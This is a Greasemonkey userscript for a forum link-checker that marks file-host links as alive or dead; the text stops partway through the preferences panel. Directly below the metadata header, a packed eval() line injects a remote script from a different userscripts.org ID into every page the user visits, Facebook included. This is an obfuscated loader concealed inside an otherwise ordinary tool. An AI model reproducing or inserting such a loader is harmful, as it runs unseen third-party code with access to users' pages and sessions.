// ==UserScript==
// @name		The Cavern Links Checker Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace	http://userscripts.org/scripts/show/29222
// @include		http://*
//
// @exclude		http://www.bitlet.org/*
// @exclude		http://www.evernote.com/*
// @exclude		https://www.evernote.com/*
// @exclude		http://www.tuenti.com/*
// @require		https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js

// ==/UserScript==
// version		3.81 15 Feb 2012
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var yahslinkchecker = function(browser){
	var local_version = new Number(3.81);

	////////////////////////////////////////////////////////////////////////////////////////////////////////
	//    Variables (Global for yahslinkchecker)
	////////////////////////////////////////////////////////////////////////////////////////////////////////
	var allHostsMatch = "";
	var arr_allHostsMatch = [];
	var bSlash = String.fromCharCode(92)
	var count = 0;
	var flag_cavern = false;
	var GMHosts = [];
	var hosts = [];
	var imgs = [];
	var numberofhflinks = 0;
	var numberofmulinks = 0;
	var numberofrslinks = 0;
	var numberoffslinks = 0;

	var other_link_qty = 0;
	var other_alive = [];
	var other_dead = [];
	var other_maybe = [];
	var other_links = [];
	var redirs = [];
	var redirs_regex = "";
	var ret = String.fromCharCode(13) + String.fromCharCode(10);
	
	//GM_log("------- Start -------");

	//this.somefn = function() and variables are ONLY to be used for outside access
	//	this.get_hosts() - Start for ALL extensions/browsers
	//	this.check_version() - Start ONLY when using GM

	if (document.URL.search(/http\:\/\/www\.thecavernforum\.com/gi) != -1){flag_cavern = true};

	////////////////////////////////////////////////////////////////////////////////////////////////////////
	//    Read Preferences
	////////////////////////////////////////////////////////////////////////////////////////////////////////
	var pref1 = GM_getValue("linkify", true);
	var pref2 = GM_getValue("highlight_full_link", true);
	var pref5 = GM_getValue("flag_bad_image_hosts", true);
	var pref6 = GM_getValue("flag_redirectors", true);
	var pref8 = GM_getValue("flag_mouseover_mode", false);
	var pref3 = GM_getValue("link_color_alive", "paleGreen"); if(pref3 == ""){pref3 = "paleGreen"};
	var pref4 = GM_getValue("link_color_dead", "lightPink"); if(pref4 == ""){pref4 = "lightPink"};
	var pref7 = GM_getValue("link_color_maybe", "yellow"); if(pref7 == ""){pref7 = "yellow"};

	////////////////////////////////////////////////////////////////////////////////////////////////////////
	//    Regular expressions
	////////////////////////////////////////////////////////////////////////////////////////////////////////
	var all_filesonic_regex = /http:\/\/(www\.)*filesonic\.(com|fr|in|at|nl|cz|it|jp|pk|vn)\/file|http:\/\/(www\.)*sharingmatrix\.com\/file/gi;
	var all_hotfile_regex = /http:\/\/(www\.)*hotfile\.com|http:\/\/new\.hotfile\.com/gi;
	var all_megaupload_regex = /http:\/\/(www\.)*megaupload\.com/gi;
	var all_rapidshare_regex = /(https*\:|^.*?https*:|^.*?https*%3A)\/\/(www\.)*rapidshare\.com\/(files|#\!download)/gi;
	var cavern_regex = /http:\/\/www\.thecavernforum/gi;
	var imgs_regex = /http:\/\/127.0.0.1|http:\/\/www\.thecavernforum|IMAGESHACK\.US|PHOTOBUCKET\.COM|WEBSHOTS\.COM|lulzimg\.com|imgur\.com/gi;
	var img_exts_regex = /.gif|.jpg|.png/gi;

	////////////////////////////////////////////////////////////////////////////////////////////////////////
	//    Inline Images + GM Styles
	////////////////////////////////////////////////////////////////////////////////////////////////////////
	var dead_png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH2AMJCQkjdGXwDAAAAcpJREFUeNptkj9PFHEQhp/ZBcIhxyKHYgNCYUxogE0OpdDGxsQCY6e5ggS1Mn4Ce621u7MCYqOdX4DkSLTBqwyNiQmJBiJiDjmWP/ub1+IAMXGqmTx5M5nJY5wpwRiQHPfoL2rG8PVksDOBlKRYZWgwxcwkIQlc0o+fDe3sPu6E1dOQIGWg/yUT4zOUBiLtHYAHFBy6YvRrW+Hzl4/e/P2kAJ8iwRhJscrE+AzDwxG3Z2E/oO9bKMvhzj104aLZ1dFr9PZUWzDWASQMDaYqDZjdvAWzd2HkMlpcJKpUsMlJdHiI3i1Ffr4v9d29pEMnt7UyfOkNNjKKTU8Tl8tghq+sEGqvUZwjZA5EAiShPIetLXxhASSIY3An1Gr4xkabq70iar9OkOeoWCSqVMAM8hzMiObnIUnQ0RFyR0DkgNylzhh7cB+bmsLrdQ7n5gj1OlG5TPxoHro7kUsC4mdQUB5u0NdziW/r5q2M/PkLfG2NsLwMkRHevyVkWQib26t+FJYMIIOUvt5XdmXkunXEke/sQchRCNDdRfAQ8vXND97af1qCxqkRLUj9XKFq/cUUMMmRQHKFZquh7OBhCRr/aATQ/I97foxKZ9z7A9QA5voyr3dtAAAAAElFTkSuQmCC';
	var live_png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH2AMJCQY36Sc4vgAAAlRJREFUeNpV0r9PE3EABfD3veu1lJYr15ZCoBHBqJBAMEbjL0hYFAkyOAmJMUYd/Q+cXF1wYPQPILppYkKIRARiMDGoaAKimBaKHMWDXnu93venE0Tf9Ib3tg/BP7m3NGgwxtKcM4vyIKSk4BBqnwux9/LGKjvckcNy9/1Akgk2ZJHMWNyw+qWUMSGZ51R2FzbdX1NSyOnZWznn6HRn8UqSCv6gLdz58GSsL2voURJIirAWhh+U1fLO4tbKztdJIvHsw/1NR7/97pJBOR9tDXc+6rMGsg4vkd3AhkMdVJgLounkdKLHdL1S13ZpdyMzbK5pnNF0I0mNn4r3Ze3AJrZvo0zL8KkPyil6rTOgipFzrRezLXVt4zWKtBbwWjIeTgyEQlHiUhepcBpNkSaYehxX20Yw2HYd3VYP6iNRYhrpAeojGfJqvs7rRIyKGpSUGOm4iYgWwX7wB72ps/hWXMZCbgaNkUYQrseUr3SNB0JQRj0DBnSlYWN/DcfNEzifuYzVvS94vf4cVeoiBB2ScY8IiBBnytk7KM5XG8qj9SRClrbnUKNVZKLNWMjPwKkWkYk146BSUbZrz0PC0ZuHzaBYLokq9S90p3pMJRnJl35gtfgZQnAko0lY4WY1+2lu63s+N0EE+agXXrkydc3czjtF7noHXccSx82mWIY0hBpgRVMIalK9WX67tfJzfZJo5EVuouAdieh4kk3KQA21J1rGmuoy/UToMSG5t+vaC5u/7Smikenc04LzHyMAaH+cNcBVGgyWClSIgHAA+2DYy00Wjuz9Bce5MucW9xnuAAAAAElFTkSuQmCC';
	var mayb_png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAOxJREFUeNqMkk8OwVAQxr+276kdCfuegGOIBTfgBhYsxAlIRMQJxAXEQl2EG5QLdFlSHTO0/raYZPLevPl+ne+lzwBgxEmyHsPcGW9hq5PNS8S9kPem4sKKDyIRuGvCxgU87wY0mgD3jk9wqGLg/nUBKlWg1QZ8HxgNCYc9MJ4YV5jBnOgsLigrlytNSql7LQNN8YkfUSg+9qwPzG9iudegT+h0jNdGlq3pTFOprKjb0x+9TEjuMV/o1N5Xe46Tfi5mNdMn/Bnyr8z4JXxEvUbYbVO5SKAz0+rPKVqg5N0lE8VqkCLOizjJiwADACqhr7BunfI1AAAAAElFTkSuQmCC';
	var redr_png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAAMCAIAAACx5EmIAAAABGdBTUEAALGPC%2FxhBQAAAuNJREFUSEvVVFtIk2EY%2FldeOCTzQiqzwIWoFEFCqRUJ00Kdu%2BgijA6yqKAbO1xUlumkolBc%2B5da6cwxxSAtcTLxkBSIJ9B1QM3S7EKzYAkeMCoievrfb9%2FcdFsLusmPn5%2F39Dzv87%2Ff938yAMKyW5JoTA2hUIfSUnoMejT0UdDPmoJWi09Aby3yjf6K%2Fy3%2FtAa6GncKgZz%2BYmnai56rzf762Ki%2B9QusBVCd81fsNW%2BH5uJfAQ%2Buh7DOQ%2FQrIyl44YxHCQhM4k7HI5jN6HjrwrRVwyR99zhBnsxhahhtbGdqqzD5AZUV6Bkh1xP4vIWoWlibuQnEyCAo0NzFmaVUlRkjM9xdYBuZw4loBCT6EF3Zhd5ODL6GXMDmk1SkPwRhJRITSd8NNvvsJLLj4qFYS4bUMW8nH4Njr6I3wTKJsmNLgeJhyiYk0FvfiaGHbGMDsENDtBGSvQrxWyloHqDIAlvjOG6mIPyAD9ELJyQuFmNSzQwhT9%2FH7Cxy06iBg%2BtMLRkv73LRBSkQYnhKkcmo570DzzdQUsxEaDIZ6mAEq8m4d4TqHStrO6l3NOJsUsFRxGb5EF33Bg9yqPpWO6voIzs0DCGrEbkFkVGYnaCI1c6yY15Ea8r%2BBKx2O2NSXbIcQfuoPmMDVii5Jmsu%2FwCpEWcDHp%2BFMt%2BH6GEWP7WNYLZvfNKlbLPqtVBfAb5TKruRIgPlXkQfr2AUdkp5AnPZAbNcw8Z4pjUcgUx00X7XpC%2FshhDEJ83ZgAkbmhZdaG63R7%2FzY%2BicrCEnR0l06en0vlTPIuxMp6YiIoSMZz%2Bh3QUhjLfJKOYUlz2A1xmJSkXvzBIqy2NUe9m%2BhwiQhSFtD0UaPi5lS5NDkHtMenoUoohpZ%2FxdD8QijM6T32qCwYBWNm%2FHqi%2BGTo9fwG0Rn4HBdpRbKG4U0T3qKvMEdtURVZ3zusAP3ClBoYlDpJRBxPuv3HVn67bAyFo4l%2FMPcI%2F99%2FayFP0b9B9I5enpru8AAAAASUVORK5CYII%3D';
	var ok_img_png = 'data:image/png;base64,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'
	var bad_img_png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF4AAAAOCAIAAAApPjzOAAAABGdBTUEAALGPC/xhBQAABCNJREFUWEftln9M1GUcx7/MbDaEln+0asmyzVuycKNW1vrBghULSPyjyMFa12kc3lEehkyYuXYtfxzxY3CDOrQQ22zgwoZoP0VHoWs2TJuFJWWNYbQif6VJ3avn89z3PL9w4MEf/sWzZ8f7+3k+v573836eEQcY0yMqA4qa6RGVAWOal/EYmKZmXG2EqdndQOFG8Sos5NszfPEeq+umLqi9zdbwM+Tl0fPr1BPGEtnXhdPJuVhcx/fZWU9ZfWg5TI1sphHOqjeZbSfxpmHcOvUiqxdZw88J44cGp54wlsj2NdL8UCyuY3wCz9CsT27p7Zc7D1PT08br2+Bvyd46gC8LY76ZILBGTiPwWSRftRvHci5ewuWkTx9T7w6cLtxuev+Qz1fTI+HyfYGyMvE82kFxHYP7KSyiuVtW7A5erolkVoVWFuOunqhW8CchWs2gdYe7XpPm/wSng+IrckpvRTjLI95dmylyS7e6WTz3SeATBfQHeWE+s9KtqpFzTtIyslKTfwszk/H7mWmQtUkc0gzx2bCBeA06z3K8TkB9A57FAi6AN8NKzaDYt/azdZmApDTyHxGgZmWF/ObpyzvbwJZN0ztS615PlFodw/CD+Jf4KckWoAyXR4iaRBvr1wtYVCor63QhZUlJEKBGi0PAWw08epsAxW/5YyY1fZeoyiVpqZUaOedkKzV3oyqr4FwXlZXkP6hT6xsXOCKeI92Cd2kF723C5zJ3ewLeeNxKzZAsbf+F7W6zP/ojeR4ymFeguxnB58M2Q5YWFqHuxqhaX8LKVIybqK2kxi+rzwVGU6NUo0b+XK7PgP/Ex6flGTr10g6q9PmVB/C9bdrPd4mlSx0pbHZwf8lVqUmBkxJT8Aqlq/DVUbOR030ROkLb6w7yprp9SkdtBPcJ+HkCalaEqTksoOkbaSLjBmzLzNbveYqL8LBB8gr4cXStA/DiAuLm4V1LaQWNjbTtG03N79pgtxGfZWb4KMQWzDDI9Apo8TNHa1bNo0oAnQI6deSeCnJ8V6XmLrPd3FoBmSpRqml5oEyA90nJeBCy402NrNPKHIiZmsBhyZM+iwVKIz0S+/6pMEfFUWrt/5ctBWFyjwhoveJpD12o0DP8vHoylGq0UhKXCBj+QPDn/7DbT9zNJlnKsvZTOCZLn5wX48ctbGq2UvNSCsYcU4FbTlChXqYE8Tj1tcmukciAfveGtPzUbKiV3z3DjGj5qLl4ubZ/Fwk3WxgQe+A4gWfDGzsooErxCikGCTkC7HeYeTLvxJgdpdaHv2m3haab/V0zfehPq8c8GIVz1MuiVA+nvycpLJD2Q2L56xhzw5ZUu5nhRm3xHuBpFXidlRpLkQk/VrnY0Ssewzsl3VexR07e81rWGtPd5P8brl4S1pGBp33y251MxLWsNaav/wG6GRXYoAbWagAAAABJRU5ErkJggg=='

	if (pref2 != true){pref3 = pref4 = pref7 = ""};

	GM_addStyle("#live_link {background:" + pref3 + " url("+live_png+") no-repeat scroll 100% 50%;padding-right:17px;}");
	GM_addStyle("#dead_link {background:" + pref4 + " url("+dead_png+") no-repeat scroll 100% 50%;padding-right:17px;}");
	GM_addStyle("#mayb_link {background:" + pref7 + " url("+mayb_png+") no-repeat scroll 100% 50%;padding-right:17px;}");
	GM_addStyle("#redr_link {background:" + pref4 + " url("+redr_png+") no-repeat scroll 100% 50%;padding-right:65px;}");
	GM_addStyle("#ok_img_link {background:" + pref3 + " url("+ok_img_png+") no-repeat scroll 100% 50%;padding-right:120px;}");
	GM_addStyle("#bad_img_link {background:" + pref4 + " url("+bad_img_png+") no-repeat scroll 100% 50%;padding-right:95px;}");

	this.check_version = function(){
		//GM_log("this.check_version() - start");
		////////////////////////////////////////////////////////////////////////////////////////////////////////
		//    Check to see if a new version exists
		////////////////////////////////////////////////////////////////////////////////////////////////////////
		//GM_setValue("checked_for_new_version", 20090101);
		var d = new Date();
		var dy = d.getFullYear();
		var dm = d.getMonth() + 1;
		var dd = d.getDate();
		var ys = new String(dy);
		var ms = new String(dm);
		var ds = new String(dd);
		if ( ms.length == 1 ) ms = "0" + ms;
		if ( ds.length == 1 ) ds = "0" + ds;
		ys = parseFloat(ys + ms + ds);

		var upd = GM_getValue("checked_for_new_version", 0);
		if(ys > upd){
		    //alert("Need to check_for_new_version");
		    GM_setValue("checked_for_new_version", ys);
		    GM_xmlhttpRequest({
		        method: "GET",
		        url: 'http://docs.google.com/Doc?id=dgh8sg4s_23g4kqmnfv',
		        headers:{'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey', 'Content-type':'application/x-www-form-urlencoded'},
		        data:'',
		        onload:function(result) {
		            var res = result.responseText;
		            var start_pos = res.indexOf("*Version");
		            var stop_pos = res.indexOf("*", start_pos + 1);
		            var server_version = new Number(0);
		            server_version = res.substr(start_pos + 8, (stop_pos - start_pos - 8 ));
		            if (server_version > local_version){
		                alert("There is a new version of The Cavern Links Checker. Redirecting to the install page");
		                location.replace("http://userscripts.org/scripts/source/29222.user.js");
		            }
		            this.get_hosts();
		        }
		    });
		} else {
		    this.get_hosts();
		}
		//GM_log("this.check_version() - end");
	}

	////////////////////////////////////////////////////////////////////////////////////////////////////////
	//    Setup menu for TCLC preferences
	////////////////////////////////////////////////////////////////////////////////////////////////////////
	//GM_log("this.browser: " + browser);
	if (browser == "GM"){
		
		//Functions
		chk = function(ck){
			return (ck == true)?("checked"):("");
		}
		update_prefs = function(){
			//GM_log("Update_prefs()");
			GM_setValue("linkify", document.getElementById('p1').checked);
			GM_setValue("highlight_full_link", document.getElementById('p2').checked);
			GM_setValue("link_color_alive", document.getElementById('p3').value);
			GM_setValue("link_color_dead", document.getElementById('p4').value);
			GM_setValue("flag_bad_image_hosts", document.getElementById('p5').checked);
			GM_setValue("flag_redirectors", document.getElementById('p6').checked);
			GM_setValue("link_color_maybe", document.getElementById('p7').value);
			GM_setValue("flag_mouseover_mode", document.getElementById('p8').checked);
			window.location.reload();
			}
		all_hosts_enable = function(){
			var new_hosts = "";
			for (var i = 0; i < hosts.length; i++){
		    	new_hosts = new_hosts + hosts[i][0] + "|";
			}
			GM_setValue("hosts_enabled", new_hosts);
			GMHosts = new_hosts;
			//show_prefs()
			refresh_filehosts();
		}
		all_hosts_disable = function(){
			var new_hosts = "|";
			GM_setValue("hosts_enabled", new_hosts);
			GMHosts = "";
			//show_prefs()
			refresh_filehosts();
		}
		filehosts_update = function(){
			//GM_log("filehosts_update()");
			//GM_setValue("filehosts_loaded_date", 0);
			GM_setValue("filehosts_loaded_date", 20090101);
			//GM_log("filehosts_loaded_date: from filehosts_update: " + GM_getValue("filehosts_loaded_date"));
			get_hosts();
			alert("This may take a few seconds. You must re-open preferences to see updates.");
			window.location.reload();
		}
		host_enable = function(){
			var host = document.getElementById('list_available').options[document.getElementById('list_available').selectedIndex].text;
			var key = GM_getValue("hosts_enabled", "");
			if (key == ""){
				GM_setValue("hosts_enabled", host + "|");
				GMHosts = GMHosts + host + "|";
			} else {
				GM_setValue("hosts_enabled", key + host + "|");
				GMHosts = key + host + "|";
			}
			//show_prefs()
			refresh_filehosts();
			}
		host_disable = function(){
			var old_hosts = GM_getValue("hosts_enabled", "");
			var selHost = document.getElementById('list_enabled').options[document.getElementById('list_enabled').selectedIndex].text;
			var new_hosts = "";
			var hostArray = old_hosts.split('|');
			for (var key in hostArray) {
				var aHost = hostArray[key];
			    if (aHost != selHost){
			    	new_hosts = new_hosts + aHost + "|";
			    }
			}
			GM_setValue("hosts_enabled", new_hosts);
			GMHosts = new_hosts;
			//show_prefs()
			refresh_filehosts();
			}
		refresh_filehosts = function(){
			//GM_log("refresh_filehosts()");
			var list = document.getElementById('list_enabled');
			list.length = 0;
			for (var i = 0; i < hosts.length; i++){		// Enabled Hosts
				var host = hosts[i][0];
				if (GMHosts.indexOf(host + "|") != -1){
					list.add(new Option(host, host), null);
				}
			}
			var list = document.getElementById('list_available');
			list.length = 0;
			for (var i = 0; i < hosts.length; i++){		// Enabled Hosts
				var host = hosts[i][0];
				if (GMHosts.indexOf(host + "|") == -1){
					list.add(new Option(host, host), null);
				}
			}
		}
		show_prefs = function(){
			//GM_log("show_prefs()");
			//GM_log("GMHosts: " + GMHosts.length);
			var div_prefs = document.createElement('div_prefs');
			document.body.appendChild(div_prefs);
			div_prefs.id = "div_prefs";

		    var t = new Array();
		    var divL = (innerWidth - 720).toString();
		    var divT = (innerHeight - 600).toString();
		
			var pref3 = GM_getValue("link_color_alive", ""); if(pref3 == ""){pref3 = "paleGreen"};
			var pref4 = GM_getValue("link_color_dead", ""); if(pref4 == ""){pref4 = "lightPink"};
			var pref7 = GM_getValue("link_color_maybe", ""); if(pref7 == ""){pref7 = "yellow"};
		
			GM_addStyle("#prefs_donate {font-family:'Verdana' !important; color:black !important; font-size: 12px !important; font-weight: bold !important;}");
			GM_addStyle("#prefs_html {z-index:999999 !important}");
			GM_addStyle("#prefs_header {font-family:'Verdana' !important; color:black !important; font-size: 15px !important; font-weight: bold !important;}");
			GM_addStyle(".prefs_text {font-family:'Verdana' !important; color:black !important; font-size: 12px !important;}");
			//GM_addStyle(".prefs_btn  {background-color:#ECE9D8 !important; border:3px outset black !important; font-family:'Verdana' !important; color:blue !important; font-size: 12px !important; padding-left:6px !important; padding-left:6px !important;}");
			GM_addStyle(".prefs_btn {-moz-appearance:button !important; -moz-binding:none !important; -moz-box-sizing:border-box !important; border-collapse: separate !important; color:buttontext !important; cursor:default !important; font:-moz-button !important; line-height:normal !important; overflow: visible !important; padding:0 6px !important; text-align:center !important; text-shadow:none !important;}");
			//GM_addStyle(".prefs_btn {-moz-appearance:button !important; -moz-binding:none !important; -moz-box-sizing:border-box !important; -moz-user-select:none !important;}");
		
			//GM_addStyle(".prefs_btn  {background-color:#ECE9D8 !important; border-style:outset !important; border-color:#ECE9D8 !important; color:#0000FF !important; font-family:'MS Shell Dlg' !important; color:blue !important; font-size: 12px !important; padding-left:6px !important; padding-left:6px !important;}");
		
		    t.push('<div id="prefs_html" class="prefs_html" style = "position: fixed !important; top:' + divT + 'px !important; left:' + divL + 'px !important; width:700px !important; background-color: #EEEEEE !important;" >');
		    t.push('	<table border=2 cellspacing=0 width=700px><tr>');
		    t.push('		<td><center><b id="prefs_header">The Cavern Links Checker Preferences<b></center></td>');
		    t.push('		<td valign=top><center><button id="tclc_close_prefs" class="prefs_btn" type="button" onClick="update_prefs()"><font size=-2><b>X</b></font></button></center></td>');
		    t.push('	</tr></table>');
		    t.push('	<table border=2 cellspacing=0>');
		    t.push('		<tr>');
		    t.push('			<td width=175px>');
		    t.push('				<center><b class="prefs_text">Enabled Hosts</b><br>');
		    t.push('				<select id="list_enabled" name="list_enabled" size=15>');
												for (var ii = 0; ii < hosts.length; ii++){
		 											var host = hosts[ii][0];
		 											if (GMHosts.indexOf(host + "|") != -1){
			t.push('									<option value="' + host + '" class="prefs_text">' + host + '</option>');
				    								}
												}
		    t.push('				</select><br>');
		    t.push('				<button id="tclc_host_disable" class="prefs_btn" type="button" onClick="host_disable()">Disable Host</button>');
		    t.push('				<button id="tclc_all_hosts_disable" class="prefs_btn" type="button" onClick="all_hosts_disable()">All</button></center>');
		   	t.push('			</td><td width=175px>');
		    t.push('				<center><b class="prefs_text">Available Hosts</b><br>');
		    t.push('				<select id="list_available" name="list_available" size=15>');
		 										for (var ii = 0; ii < hosts.length; ii++){
		 											var host = hosts[ii][0];
		 											if (GMHosts.indexOf(host + "|") == -1){
			t.push('									<option value="' + host + '" class="prefs_text">' + host + '</option>');
													} else {
													}
		 										}
		    t.push('				</select><br>');
		    t.push('				<button id="tclc_host_enable" class="prefs_btn" type="button" onClick="host_enable()">Enable Host</button>');
		    t.push('				<button id="tclc_all_hosts_enable" class="prefs_btn" type="button" onClick="all_hosts_enable()">All</button></center>');
			t.push('			</td><td width=350px>');
		   	t.push('				<table border=0 cellpadding=0 cellspacing=0 valign="top">');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;Enable Linkify</td><td><input type="checkbox" name="p1" id="p1" ' + chk(pref1) + '></b></td>');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;Highlight Full Link</td><td><input type="checkbox" name="p2" id="p2" ' + chk(pref2) + '></b></td>');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;Good Link Color</td><td><input type="text" name="p3" id="p3" value=' + pref3 + ' size="10" style="background-color: ' + pref3 + ';"></b></td>');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;Bad Link Color</td><td><input type="text" name="p4" id="p4" value=' + pref4 + ' size="10" style="background-color: ' + pref4 + ';"></b></td>');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;Maybe Link Color</td><td><input type="text" name="p7" id="p7" value=' + pref7 + ' size="10" style="background-color: ' + pref7 + ';"></b></td>');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;Flag bad image hosts&nbsp;&nbsp;</td><td><input type="checkbox" name="p5" id="p5" ' + chk(pref5) + '></b></td>');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;Flag Redirectors</td><td><input type="checkbox" name="p6" id="p6" ' + chk(pref6) + '></b></td>');
			t.push('					<tr align=left><td><b class="prefs_text">&nbsp;MouseOver Mode</td><td><input type="checkbox" name="p8" id="p8" ' + chk(pref8) + '></b></td>');
			t.push('					<tr>&nbsp;</td>');
			t.push('					<tr>&nbsp;</td>');
			t.push('					<tr align=left><td><button id="tclc_filehosts_update" class="prefs_btn" type="button" onClick="filehosts_update()">Update Filehosts now</button></td>');	
			t.push('					<tr></tr>');
			t.push('				</table>');
			t.push('			</td>');
		   	t.push('		</tr>');
		    t.push('	</table>');
		    t.push('	<table border=2 cellspacing=0 width=700px><tr>');
		    t.push('		<td><center>');
		    t.push('			<table border=0><tr>');
		    t.push('				<td><b id="prefs_donate">Please donate to keep this Script alive and growing:<b>&nbsp;&nbsp;</td>');
		    t.push('				<td><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=98CL9GYVNBZNU"><img src="http://yahavatar.com/images/buttons/btn_donate_LG.png" style="height: 20px !important; border: 0px !important;"></a></center></td>');
		    t.push('			</tr></table>');
		    t.push('		</td><td valign=center><center><button id="tclc_close_prefs1" class="prefs_btn" type="button" onClick="update_prefs()"><font size=-2><b>X</b></font></button></center></td>');
		    t.push('	</tr></table>');
		    t.push('</div>');
			div_prefs.innerHTML = t.join('\n');
			var t = t.join('\n')
			var width  = 300;
			var height = 200;
			var left   = (screen.width  - width)/2;
			var top    = (screen.height - height)/2;
			var params = 'width='+width+', height='+height;
			params += ', top='+top+', left='+left;
			params += ', directories=no';
			params += ', location=no';
